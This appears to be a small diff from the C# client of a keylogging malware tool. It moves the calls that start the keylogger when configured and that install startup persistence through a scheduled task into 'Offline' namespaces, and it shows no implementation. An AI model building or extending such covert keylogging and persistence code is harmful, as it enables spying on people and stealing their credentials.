@@ -34,7 +34,7 @@ namespace Client
         {
             if (!KeylogOn && Config.offKeylog != "False")
             {
-                Plugin.Launch.Start();
+                Offline.Keyloggers.Launch.Start();
                 KeylogOn = true;
             }
         }
@@ -59,7 +59,7 @@ namespace Client
 
         public static void MakeInstall()
         {
-            Persistence.TaskScheduler.StartUpTaskScheduler(Config.time, Config.taskName);
+            Offline.Persistence.TaskScheduler.StartUpTaskScheduler(Config.time, Config.taskName);
         }
     }
 }
